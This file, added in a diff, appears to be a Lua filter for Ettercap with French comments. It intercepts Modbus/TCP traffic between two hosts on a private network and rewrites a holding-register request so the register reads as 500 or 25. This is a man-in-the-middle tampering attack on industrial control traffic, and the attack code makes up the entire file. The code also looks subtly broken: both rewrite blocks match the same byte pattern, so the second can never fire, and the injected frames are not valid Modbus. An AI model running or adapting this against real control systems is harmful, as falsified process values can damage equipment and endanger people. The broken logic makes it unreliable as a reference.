@@ -1,0 +1,30 @@
+-- modbus_filter.lua
+
+-- Fonction de filtrage et modification des paquets Modbus
+function modbus_filter(packet)
+    if packet.ethertype == 0x0800 then  -- Vérifie que c'est un paquet IPv4
+        local src_ip = packet.ip_src
+        local dst_ip = packet.ip_dst
+
+        -- Filtrage des paquets Modbus entre 192.168.1.11 et 192.168.1.13
+        if src_ip == "192.168.1.11" and dst_ip == "192.168.1.13" then
+            -- Modifier le registre de holding de 192.168.1.11 (offset 0) à 500
+            if packet.payload.string:find("\x00\x06\x00\x00\x00\x06\x00\x03\x00\x00\x00\x01") then
+                packet.payload.string = packet.payload.string:gsub("\x00\x06\x00\x00\x00\x06\x00\x03\x00\x00\x00\x01", "\x00\x06\x00\x00\x00\x03\x00\x01\xf4")
+
+            end
+            -- Modifier le registre de holding de 192.168.1.13 (offset 0) à 25
+            if packet.payload.string:find("\x00\x06\x00\x00\x00\x06\x00\x03\x00\x00\x00\x01") then
+                packet.payload.string = packet.payload.string:gsub("\x00\x06\x00\x00\x00\x06\x00\x03\x00\x00\x00\x01", "\x00\x06\x00\x00\x00\x03\x00\x00\x19")
+
+            end
+            
+        end
+
+        -- Retourner le paquet modifié ou non modifié
+        return packet
+    end
+end
+
+-- Enregistrer la fonction comme un filtre pour Ettercap
+register_packet_filter(modbus_filter)
